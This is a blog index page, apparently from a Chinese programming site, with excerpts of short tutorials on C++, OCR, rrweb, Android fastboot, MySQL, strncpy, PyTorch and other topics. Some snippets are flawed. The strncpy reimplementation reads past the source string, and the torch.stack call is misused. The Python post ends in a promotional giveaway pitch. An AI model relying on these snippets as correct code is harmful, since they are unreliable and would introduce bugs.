		<h2 class="list__title post__title">
			<a href="/posts/47e71dd41749c275b4fac9cafd8b01a5/" rel="bookmark">
			C&#43;&#43;定义一个Person基类和Employee子类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要求：定义一个基类 Person ，它有 3 个 protected 的数据成员：姓名 name(String 类型 ) 、性别 sex(char 类型 ) 、年龄 age(int 类型 ) ；一个构 造函数用于对数据成员初始化；有一个成员函数 show() 用于输出数据 成员的信息。 创建 Person 类的公有派生类 Employee ，增加两个数据成员基本工资 basicSalary （ int 类型）请假天数 leaveDays （ int 型）；为它定义初始化 成员信息的构造函数，和显示数据成员信息的成员函数 show() 。 程序运行过程：实现进行基类中的初始化及输出，然后再子类重新初始化基类中继承的相关变量。
代码如下：
#include&lt;iostream&gt; using namespace std; class Person //定义一个Person基类 { public: Person() //定义构造函数，实现数据初始化 { cout &lt;&lt; "请输入姓名、性别、年龄" &lt;&lt; endl; cin &gt;&gt; name &gt;&gt; sex &gt;&gt; age; } void show() //定义show()成员函数，实现输出 { cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47e71dd41749c275b4fac9cafd8b01a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/555856f78094ade18908f3a65f9f9458/" rel="bookmark">
			nodejs实现ocr
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 效果展示详细代码1. 支持多语言识别2. 提高识别性能3.前端代码 ocr即光学字符识别，简单的来说就是把图片上的文字识别出来。 很遗憾我只是一个底层的web程序员😢，不咋会AI，要想实现ocr，只能找找第三方库了。
python语言有很多ocr的第三方库，找了很久nodejs实现ocr的第三方库,最后发现了tesseract.js这个库还是能很方便的实现ocr.
效果展示 在线示例: http://www.lolmbbs.com/tool/ocr
详细代码 tesserract.js 这个库提供了多个版本供选择，我这里使用的是离线的版本tesseract.js-offline,毕竟谁都由网络不好的时候。
默认示例代码
const { createWorker } = require('tesseract.js'); const path = require('path'); const worker = createWorker({ langPath: path.join(__dirname, '..', 'lang-data'), logger: m =&gt; console.log(m), }); (async () =&gt; { await worker.load(); await worker.loadLanguage('eng'); await worker.initialize('eng'); const { data: { text } } = await worker.recognize(path.join(__dirname, '..', 'images', 'testocr.png')); console.log(text); await worker.terminate(); })(); 1. 支持多语言识别 tesseract.js 离线版本默认示例代码只支持识别英文，如果识别中文，结果会是一堆问号。但是幸运的是你可以导入多个训练好的语言模型，让它支持多个语言的识别。
从https://github.com/naptha/tessdata/tree/gh-pages/4.0.0这里下载你需要的对应语言模型，放入到根目录下的lang-data目录下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/555856f78094ade18908f3a65f9f9458/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b2fa9e2b9ffd7f19a2b39dc46023d82/" rel="bookmark">
			C&#43;&#43;定义Student类，计算全班总分和平均分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		具体要求如下：定义一个Student类，在该类定义中包括一个数据成员score（分
数）、两个静态数据成员total（总分）和学生人数count；成员函
数scoretotalcount（floats）用于设置分数、求总分和累计学生人数；
静态成员函数sum（）用于返回总分；静态成员函数average（）
用于求平均值。在main（）函数中，输入某班同学的成绩，并调用
上述函数求全班学生的总分和平均分。注意静态变量在类外初始化，如： float Student::total = 0; int Student::count = 0;如下代码实现求班级总分和人数void Student::scoretotalcount(float s){ score = s; total = total + score; count++;}具体代码如下： #include&lt;iostream&gt;using namespace std;class Student{private: float score; static float total; static int count;public: void scoretotalcount(float s); //声明scoretotalcount()函数，实现求学生总数，成绩总分 static float sum(); //声明sum()函数，返回总成绩 static float average(); //声明average()函数，返回平均数};float Student::total = 0;int Student::count = 0;void Student::scoretotalcount(float s){ score = s; total = total + score; count++;}float Student::sum(){ return total;}float Student::average(){ return total / count;}int main(){ Student stu[100]; int i, n; float s; cin &gt;&gt; n; for (i = 0; i &lt; n; i++) { cin &gt;&gt; s; stu[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b2fa9e2b9ffd7f19a2b39dc46023d82/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be4c572a7596fa66fba6d8f5ed7bdf51/" rel="bookmark">
			前端监控：回放录制库 rrweb
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rrweb rrweb 主要由 rrweb 、 rrweb-player 和 rrweb-snapshot 三个库组成：
rrweb：提供了 record 和 replay 两个方法；record 方法用来记录页面上 DOM 的变化，replay 方法支持根据时间戳去还原 DOM 的变化。rrweb-player：基于 svelte 模板实现，为 rrweb 提供了回放的 GUI 工具，支持暂停、倍速播放、拖拽时间轴等功能。内部调用了 rrweb 的提供的 replay 等方法。rrweb-snapshot：包括 snapshot 和 rebuilding 两大特性，snapshot 用来序列化 DOM 为增量快照，rebuilding 负责将增量快照还原为 DOM。 本文主要介绍的是 rrweb 库的录制、回放实现原理。
工作流程与原理 基于 rrweb 去实现录屏，emit 回调方法可以拿到 DOM 变化对应所有 event，可以根据业务需求去做处理在 emit 内部做处理：
let events = []; rrweb.record({ /** 订阅事件监听，必需字段 */ emit(event) { events.push(event); }, }); record 方法内部会根据事件类型去初始化事件的监听，例如 DOM 元素变化、鼠标移动、鼠标交互、滚动等都有各自专属的事件监听方法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be4c572a7596fa66fba6d8f5ed7bdf51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6144d6c927db6635df4aae903e00547e/" rel="bookmark">
			linux 串口读取数据错误的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近在英伟达开发板上进行串口编程，发现了一个奇怪的问题，自己用C写的串口程序读取的数据会错乱。后来偶然间发现，先用minicom串口助手打开串口，再运行自己写的串口读写程序，读取的数据就正常了。利用stty -a &lt; /dev/hq命令，分别在第一次打开minicom、第一次打开自己写的串口程序利用该命令查看串口信息，对比如下：
框红的为不同之处，因此，在代码中添加如下：
options.c_cflag &amp;= ~HUPCL;
options.c_iflag &amp;= ~INPCK;
options.c_iflag |= IGNBRK;
options.c_iflag &amp;= ~ICRNL;
options.c_iflag &amp;= ~IXON;
options.c_lflag &amp;= ~IEXTEN;
options.c_lflag &amp;= ~ECHOK;
options.c_lflag &amp;= ~ECHOCTL;
options.c_lflag &amp;= ~ECHOKE;
options.c_oflag &amp;= ~ONLCR; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7638f694ef03d3ec7c739308e8ae608/" rel="bookmark">
			vue-i18n的9以上的版本中@被用作特殊字符处理，直接用会报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue3项目中使用vue-i18n的9以上的版本实现国际化，使用过程中出现报错：
国际化使用 "validation.regExp.name": "仅允许输入字母、数字与_.@字符"报如下错误
Message compilation error: Invalid linked format 1 | 仅允许输入字母、数字与_.@字符 Message compilation error: Unexpected lexical analysis in token: '字符' 1 | 仅允许输入字母、数字与_.@字符 Message compilation error: Unexpected empty linked key 1 | 仅允许输入字母、数字与_.@字符 报错原因：vue-i18n的9以上的版本中@被用作特殊字符处理，直接用会报错
解决方法：把@改为{'@'}。例如："validation.regExp.name": "仅允许输入字母、数字与_.{'@'}字符"
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70cf662e7e039030f0db4a9d6179c8ab/" rel="bookmark">
			2022年医药行业数据库系统V4.0 pharnexcloud（库群介绍）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		药融云医药数据可以说是国内近几年在医疗数据行业中的’黑马’，于5月9日企业版V4.0正式全新上线，目前积累了近200个医药相关数据库，数据采集涵盖中、美、日、欧等全球四十多个主要经济体，数据体系覆盖了生物医药全生命周期数据和精细化工全产业链上下游数据。同时该数据库有大量的免费数据实时共享（含药融报告）。
药融云数据库群介绍 近200个数据库的积累分类汇总为药物研发数据库群、全球上市数据库群、药品销售数据库群、市场信息数据库群、一致性评价数据库群、原料药数据库群、医疗器械数据库群、生产检验数据库群、合理用药数据库群，九大数据库群面向医药产业链全生命周期。
①药物研发数据库群：
收录了全球已上市及未上市的（包括处于临床和临床前研究等阶段）超80000余条药物研发的详细信息；全球临床试验数据库、中国药品审评数据库等超700000条数据信息；另外还包括药代动力学、药效学、药物活性、药物安全性、不良反应报告、药物合成线路等众多研学辅助性数据库。
②全球上市数据库群：
收集美国、欧盟、日本等四十多个主流国家和地区上市药品批准信息，其中上市药品数据库有近300万条药物上市信息，涵盖药物名称、活性成分、企业、剂型、说明书等详细信息内容。多语言标准汉化，可以快捷检索、筛选全球药品信息。
③药品销售数据库群：
涵盖全国近10000家二级及以上医院的药品销售数据；分析维度涵盖年度趋势、季度趋势、企业销售格局、品种销售格局、剂型销售格局、规格销售格局、用药途径销售格局，并按可视化分析及图表与原始数据的方式进行呈现和下载。
④市场信息数据库群：
收集了全球医疗及相关领域的投资、并购事件，通过对信息和数据的生产、聚合、挖掘、加工、处理，帮助目标用户和客户节约时间和金钱、提高效率，以辅助其各类商业行为，包括风险投资、收购、竞争情报、细分行业信息、国外公司产品信息数据服务等。
⑤一致性评价数据库群：
收载仿制药参比制剂目录、参比制剂备案，美国橙皮书、美国紫皮书、日本橙皮书等。数据来源于内部人员收集整理而成。该数据库为用户查询通过一致性评价品规数据提供方便。
⑥原料药数据库群：
其中原料药用量推算数据库收载了6000+原料药用量信息。方便快速了解不同品种、不同企业、不同国家市场下，各个年份中该原料药的详细用量、占比及排行；并包含全局分析模块，清晰展示各品种、区域中该产品的用量对比情况，便于探究某原料药在目标市场近年的大致用量，及分析潜在的客户、竞争企业。
⑦医疗器械数据库群：
其中中国上市医疗器械数据库收载了超11W条数据，涵盖了器械生产地址、型号规格、管理类别、以及器械的产品来源及批准省份等信息。数据提供全文查询、下载，可精确查询器械产品名称、注册号、注册企业，便于快速查询国产器械和进口器械的相关注册信息，了解企业研发趋势。
⑧生产检验数据库群：
包括国内药品标准、国外药典、橙皮书、药包材标准、ICH指导原则等数据库；其中药品标准收载了五万余条数据信息，是较为全面的药品标准数据库。数据库支持精确查询和条件筛选，可以通过输入药品名称、正文进行查询全文和下载。
⑨合理用药数据库群：
其中药品说明书数据库收载了八万条数据，可以通过输入药品名称、成分、性状、所属类别、规格、适应症等进行精确查询和条件筛选，方便查询药品情况说明，为医药研发、市场人员提供临床用药方面的重要信息。
目前，药融云医药数据库已更新迭代到4.0版本，九大数据库群智能动态联动，数据实时智能更新，智能检索多维度匹配，数据结果可视化呈现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff0b481dfc4b2b6a5e028544a604b9fe/" rel="bookmark">
			fastboot简介（android烧录指令）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		fastboot简介 fastboot是Android快速升级的一种方法，fastboot的协议fastboot_protocol.txt在源码目录./bootable/bootloader/legacy下可以找到。
fastboot 是作为 Android 系统编译器的客户端，编译后位于 ./out/host/ Linux -x86/bin/fastboot 目录下。
fastboot实例命令：sudo fastboot flash kernel path-to-kernel/uImage
烧写rootfs 类似：sudo fastboot flash system path-to-system/system.img
3.Android手机分裂 分区都可以被烧写，并有相应的img文件：
引导启动画面区（splash1）数据恢复区（recovery）内核区（boot）系统区（system）数据缓存区（cache）用户数据区（userdata） 4.fastboot命令 4.1 查看fastboot命令的帮助 输入fastboot，显示如下信息：
update &lt;filename&gt; 从 update.zip 刷新设备 flashall flash boot + recovery + system flash &lt;partition&gt; [ &lt;filename&gt; ] 将文件写入 flash 分区 erase &lt;partition&gt; 擦除 flash 分区 getvar &lt;variable&gt; 显示引导加载程序变量 boot &lt;kernel&gt; [ &lt;ramdisk&gt; ] 下载并启动内核 flash:raw boot &lt;kernel&gt; [ &lt;ramdisk&gt; ] 创建 bootimage 并刷新 设备 列出所有连接的设备 正常重启重启设备 reboot-bootloader 将设备重启到引导加载程序 选项： -w 擦除用户数据和缓存 -s &lt;serial number&gt; 指定设备序列号 -p &lt;product&gt; 指定产品名称 -c &lt;cmdline&gt; 覆盖内核命令行 -i &lt;vendor id&gt; 指定自定义 USB 供应商 id -b &lt;base_addr &gt; 指定自定义内核基地址 -n &lt;page size&gt; 指定nand 页面大小。默认值：2048&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff0b481dfc4b2b6a5e028544a604b9fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b09fe3c0e2a689ae8ad68dec29c49724/" rel="bookmark">
			整数数据类型tinyint
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.1 tinyint类型说明1.2 实践环境说明1.3 加unsigned属性1.3.1 SQL模式开启严格模式1.3.3 SQL模式未开启严格模式 1.4 加zerofill属性1.4.1 SQL模式开启严格模式1.4.2 SQL模式未开启严格模式 1.5 不加unsigned和zerofill属性1.5.1 SQL模式开启严格模式1.5.2 SQL模式未开启严格模式 PS：mysql整数数据类型规范整理
1.1 tinyint类型说明 数据类型显示长度占用字节有符号无符号tinyint加上unsigned/zerofill：3 不加unsigned/zerofill：41(8bit)-128至1270至255 #### 格式 id tinyint(M) [unsigned] [zerofill] 字段名 数据类型(显示长度,建表时不指定) 无符号 无符号且前导零填充 #### 关于tinyint最大数值是怎样得来的 tinyint占用1字节,1字节占用8位，经过换算(2的8次方减1)就是255; #### 关于加上unsigned后的说明 加上unsigned属性后就是无符号(范围是0~255的整数,因为是整数,不会有符号"-",所以就是无符号) #### 关于加上zerofill后的说明 zerofill属性会把unsigned属性也给带上,这样就是无符号（范围是0~255，显示长度就是3），同时还会 进行前导零填充（没有达到显示长度的数值，例如：你插入1，显示的是001）。 #### 不加unsigned和zerofill的说明 字段后面不加上这两个属性中的任何一个,就表示是有符号(范围是-128~127,因为有符号"-",所有是有符号)。 1.2 实践环境说明 #### 数据库版本和默认的存储引擎 mysql&gt; select @@version,@@default_storage_engine; +------------+--------------------------+ | @@version | @@default_storage_engine | +------------+--------------------------+ | 5.7.28-log | InnoDB | +------------+--------------------------+ 1 row in set (0.00 sec) #### 创建chenliang库 mysql&gt; create database if not exists chenliang; Query OK, 1 row affected (0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b09fe3c0e2a689ae8ad68dec29c49724/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ef1bbd1689bcecc2fa0d142df2df8bc/" rel="bookmark">
			strncpy函数详解看这一篇就够了-C语言（函数实现、使用用法举例、与strcpy的区别）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先要明确strncpy的功能是：拷贝src字符串的前n个字符至dest
目录
函数介绍
与strcpy的区别
函数实现：
用法示例：
结果展示：
函数介绍 函数原型： char *strncpy(char *dest, const char *src, int n)
返回值：dest字符串起始地址
说明：
1、当src字符串长度小于n时，则拷贝完字符串后，剩余部分将用空字节填充，直到n个
strncpy不会向dest追加’\0’。
2、src和dest所指的内存区域不能重叠，且dest必须有足够的空间放置n个字符
与strcpy的区别 1、strcpy() 函数用来复制字符串；strncpy()用来复制字符串的前n个字符，所以要多传一个参数n
大家可以对比一下两个函数原型：
char *strcpy(char *dest, const char *src);
char * strncpy(char *dest, const char *src, size_t n);
2、不像strcpy()，strncpy()不会向dest追加结束标记'\0'
函数实现： //dest为目标数组，src为源数组，n为要复制的字符个数 char* My_strncpy(char* dest, const char* src, int n) { assert(dest != NULL);//保证dest非空 assert(src != NULL); //保证src非空 char* ret = dest; //将dest首地址储存在ret中，在之后dest++运算中，可以方便找到 while (n) //一次复制一个字符，要复制n次 { *dest = *src; //复制 src++; //源地址往后+1 dest++; //目标地址往后+1 n--; //跳出循环条件 } return ret; //返回目的数组的首地址 } 用法示例： #include &lt;stdio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ef1bbd1689bcecc2fa0d142df2df8bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a59abc0a56bd9e9c97c3297f00d66467/" rel="bookmark">
			三十岁了从零开始学python还有前途吗？很迷茫啊
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于学习这件事，我一直认为没有时间先后，啥时候学习都不晚，不管你现在年龄多大，只要有心想学习，一切都好说。
首先，你要学的python是属于技术类的知识，对于喜欢搞技术的朋友来说，到书店或图书馆选一本有关python的资料书，然后自己制定一个详细的学习计划，然后带着问题去阅读，你会发现这样学起来真的很轻松；
其次，明白了里面的原理，那就必须上手去操作，只有通过验证，才能理解在学习中遇到的那些晦涩难通的概念与执行原理。
当然每个人看书学习的方式与效率不同，要根据自己的情况总结出适合自己的方式，只有掌握了看不同的书的方法，才能在未来的学习中更加的游刃有余。
python,作为现在比较流行的技术语言，我们不仅仅要学习它的基本语法，操作语句及实用编程技巧，还要学习如何用它来解决生活或工作中的实际问题，而这，对于一个门外汉来说，没有任何问题，三十岁是人生进阶与发力的好时期，学东西是比较快的，所以，只要掌握语言本身的特征，想要学好它不难。
现在找软件开发工作时，一般招聘单位都要求至少熟悉两门语言，而python就是其中一种，用它做出的应用，代码简洁、流畅，薪水也不低，所以，完全不用考虑前景问题。
选择了一件事，在看好它的同时，一定要坚持下去，最终会有好的结果。
关于Python技术储备 学好 Python 不论是就业还是做副业赚钱都不错，但要学会 Python 还是要有一个学习规划。最后大家分享一份全套的 Python 学习资料，给那些想学习 Python 的小伙伴们一点帮助！
一、Python所有方向的学习路线 Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。（文末获取！）
温馨提示：篇幅有限，已打包文件夹，获取方式在“文末”！！！
二、Python必备开发工具 三、精品Python学习书籍 当我学到一定基础，有自己的理解能力的时候，会去阅读一些前辈整理的书籍或者手写的笔记资料，这些笔记详细记载了他们对一些技术点的理解，这些理解是比较独到，可以学到不一样的思路。
四、Python视频合集 观看零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
五、实战案例 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
六、Python练习题 检查学习结果。
七、面试资料 我们学习Python必然是为了找到高薪的工作，下面这些面试题是来自阿里、腾讯、字节等一线互联网大厂最新的面试资料，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
这份完整版的Python全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】 Python资料、技术、课程、解答、咨询也可以直接点击下面名片，添加官方客服斯琪↓
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5fbea6715e8d679950b8d19b9827ed6/" rel="bookmark">
			android 镜像文件img 介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android 源码 编译后，在 out/target/product/generic下生成的三个镜像文件：
ramdisk.img ： 根文件系统
system.img ：包括了主要的包、库等文件
userdata.img ： 包括了一些用户数据
以及它们对应的目录 root，system，data。
①ramdisk.img是根文件系统：android启动时 首先加载ramdisk.img镜像，并挂载到/目录下，并进行了一系列的初始化动作，包括创建各种需要的目录，初始化console，开启服务等。System.img是在init.rc中指定一些脚本命令，通过init.c进行解析并挂载到根目录下的/system目录下的。
ramdisk.img其实是对root目录的打包和压缩
root目录
init：Android最重要的进程——init，这是Android启动运行的的第一个进程，
还有两个非常重要的脚本文件： init.fs100.rc和init.rc这是Android在刚开始启动时，需要首先加载的两个启动脚本，根据脚本里的内容，来完成一系列的启动工作，
data目录是 userdata.img镜像要挂载的目录，
system即为 system.img镜像需要挂载的目录，
dev目录是系统启动后，系统的设备文件目录。
②system.img包括了主要的包、库等文件：
挂载到 / 下的镜像，它包含了全部的系统可执行文件 system.img 文件是下面system目录的一个映像，类似于linux的根文件系统的映像 system目录 app的目录下是所有的apk包，即包含了Android源码自身所发布的应用程序，又包含了用户自己编译的应用程序apk包，
bin目录下是基本的命令，系统的本地程序，主要是Linux系统自带的组件，
etc目录包含了一些配置文件和脚本文件，比如APN接入点设置等核心配置，
framework目录下包含了系统运行所需要众多的jar包，
lib目录存放了所有的库，文件系统底层库，如平台运行时库，
xbin中也包含了多种命令，
usr目录中有用户文件夹，包含共享、键盘布局、时间区域文件等。
③userdata.img包括了一些用户数据： Userdata.img来来自于data目录，默认里面是没有文件的。
补充：
① boot.img与recovery.img （ 这两个有笔记详解 ）
下图android系统分区（ 具体分区分析有专门笔记）
boot.img： Android系统中，通常会把zImage （ 内核镜像uImage文件） 和ramdisk.img打包到一起，生成一个boot.img镜像文件，放到boot分区，由bootloader来引导启动，其启动过程本质也是和分开的uImage&amp;ramdisk.img类似，只不过把两个镜像按照一定的格式合并为一个镜像而已。
bootloader会从boot分区开始启动。一般针对每个机型的完整刷机包中会有一个 boot.img文件，这就是boot分区镜像文件
Boot分区的格式是固定的，首先是2K或者4K的 文件头 ，后面跟着用gzip压缩过的 内核 ，再后面是 ramdisk根文件系统 ，然后是第二阶段的载入程序（可选）
recovery.img： recovery分区的镜像，一般用作系统恢复
注： zImage文件，通过mkimage命令，给zImage文件加上了64个字节的数据头得到uImage文件，这样才能被u-boot识别
②虽然整个Android的编译系统生成了三部分内容，但是我们也可以将这 三部分组合在一起，然后直接做成一个镜像，烧到开发板当中，就可以启动系统了！具体的操作就是，将system下所有的东西直接放在root目录下的system目录里，将用户的数据直接放在data下，这样做成一个目录fs100_root,然后将此目录直接使用工具来做成镜像，如下所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5fbea6715e8d679950b8d19b9827ed6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/381698ed94ed715ca2cc8f7c665d04bf/" rel="bookmark">
			Xcode MacOS与clang c&#43;&#43;版本关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于clang https://en.wikipedia.org/wiki/Clang
7 September 2017Clang 5.0.0 released19 January 2018Clang becomes default compiler in OpenBSD 6.3 on arm.[54]5 March 2018Clang is now used to build Google Chrome for Windows.[55]8 March 2018Clang 6.0.0 released5 September 2018Clang is now used to build Firefox for Windows.[56]19 September 2018Clang 7.0.0 released20 March 2019Clang 8.0.0 released1 July 2019Clang becomes default compiler in OpenBSD 6.6 on mips64.[57]19 September 2019Clang 9.0.0 released with official RISC-V target support.[58]29 February 2020Clang becomes the only C compiler in the FreeBSD base system, with the removal of GCC.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/381698ed94ed715ca2cc8f7c665d04bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f73e37a0dec889d6cba8d83258e29978/" rel="bookmark">
			pta mysql训练题集(321-340)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		10-321 查询“谭浩强”教师任课的课程号，选修其课程的学生的学号和成绩，结果中包括该老师没有被选修的课程
select b.cno cno,c.sno sno,c.score from teachers as a left join teaching as b on b.tno=a.tno left join sc as c on b.cno=c.cno where a.tname='谭浩强' 10-322 列出所有学生的选课情况（包括学号，姓名，课号，成绩），结果中包括没有选课的学生
select students.sno,sname,cno,score from students left join sc on students.sno = sc.sno; 10-323 查询没有选课的学生学号和姓名
select sno,sname from students where sno not in (select sno from sc) 10-324 查询信息学院学生所选修的课程号和成绩
select cno,score from sc where sno in ( select sno from students where sdept = '信息学院' ) 10-325 查询与“陆毅”同一个系的同学姓名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f73e37a0dec889d6cba8d83258e29978/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2676da7120576fb719081c1c76938b0/" rel="bookmark">
			java中字符串数字进行加减乘除运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如下示例：
String str1 = "333.4";
String str2 = "111.1";
先将字符串转化为大数字BigDecimal:
BigDecimal num1 = new BigDecimal(str1);
BigDecimal num2 = new BigDecimal(str2);
通过BigDecimal的加减乘除方法，进行运算：
加法：
BigDecimal result = num1.add(num2);
减法：
result = num1.subtract(num2);
除法：
result = num1.divide(num2);
乘法：
result = num1.multiply(num2);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c261dbf89c89453456a2401359344a30/" rel="bookmark">
			【科研-学习-pytorch】5-boardcasting、合并分割
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 boardcasting（自动推广）boardcasting使用范围应用 合并catstack 分割split chunck boardcasting（自动推广） 首维插入1将维度为1扩展为相同维度特征尺寸匹配扩展为相同尺寸后相加
boardcasting可理解为：unsqueeze + expand调整维度一致
boardcasting是由需求而来，对于不同尺寸的计算，需要手动多次处理设置尺寸一致，使用boardcasting可以自动匹配尺寸且不需要额外占用内存，准确方便且高效；
boardcasting使用范围 从最后一维开始匹配；若高维没有则先扩展1维，后匹配一致；低维需要可理解使用，如维度一致或者只有1；无法使用情况-input [4, 3, 32, 32] [2, 3, 32, 32][8][1, 2, 32, 32] 应用 input [4, 3, 32, 32]
[32, 32] h,w方向整体平移[3, 1, 1] rgb通道调整[1, 1, 1, 1] 所有像素加 合并 cat cat前提是：两特征维度一致，要拼接维度可以不一致；
stack 创造新的维度，叠加；
a = torch.rand(3, 24)
b = torch.rand(3, 24)
c = torch.stack(a, b, dim=0)
c.shape = [2, 3, 24]
拼接维度必须一致，才能创建新维度拼接；
分割 split split([2, 2], dim=0) 和 split(1, dim=0)分别拆分对应维度的长度拆分；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c261dbf89c89453456a2401359344a30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fa676c2bf2df1894f37d684b8956bd9/" rel="bookmark">
			Android换肤框架原理解析，实现皮肤随心换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 首先须知道系统资源如何加载，怎么拦截并替换资源，以下都有讲解
xml的View怎么解析的 从setContentView进入
一路走到下图这里
找到createViewFromTag
操作几乎都在这里
进入tryCreateView()看看
那么mFactory2在哪里初始化了?
让我们进入oncreate
那么如何拦截系统的创建流程？ 直接使用系统的setFactory2方法
public class Factory2Activity extends AppCompatActivity { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { // 必须在 super 之前调用 //name:view的名字 如 Textview，ListView //attrs:view里面的参数 如 宽高等 LayoutInflater.from(this).setFactory2(new LayoutInflater.Factory2() { @Nullable @Override public View onCreateView(@Nullable View parent, @NonNull String name, @NonNull Context context, @NonNull AttributeSet attrs) { return null; } @Nullable @Override public View onCreateView(@NonNull String name, @NonNull Context context, @NonNull AttributeSet attrs) { return null; } }); super.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fa676c2bf2df1894f37d684b8956bd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f7ff7d0fe5abf740554fd1f41477c03/" rel="bookmark">
			JSP表单处理的三个方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		表格数据处理方法：
GET方法：
GET方法是将信息从浏览器传递到Web服务器的默认方法，它生成一个长字符串，出现在浏览器的地址栏框中。如果有密码或其他敏感信息传递到服务器，建议最好不要使用GET方法。
GET方法具有大小限制：请求字符串中最多只能有1024个字符。
POST方法：
POST方法与GET方法将信息打包的方式完全相同，而不是将使用?作为分隔符组成文本字符串并在URL中发送。 此消息以标准输入的形式发送到后端程序，可以解析并用于处理。
使用JSP读取表单数据：
getParameter()：调用request.getParameter()方法得到一种形式参数的值
getParameterValues()：如果参数出现不止一次，那么就调用这个方法并返回多个值，例如复选框。
getParameterNames()：如果想要在当前请求下得到一个所有参数的完整的列表，那么调用这个方法。
getInputStream()：调用这个方法读取来自客户端二进制数据流。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9feb2673f4f3e397d4a91f3e9764f87/" rel="bookmark">
			切换分支，IDEA文件缓存导致文件冲突
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 今天在修BUG时，忘记切回目标分支A，当前是在分支B，意识到后就回滚了下（因为就删除一个语句，直接回滚，正常修改多的话，是先git stash，再切到目标分支，然后git stash pop），然后切回目标分支A，再次删除目标语句，这时候IDEA提示File Cache Conflict，
让我选择从内存还是文件系统选择文件内容，当时想的是我修改过，内存中肯定是最新的，我要的就是最新的，选择了Keep Memory Changes。
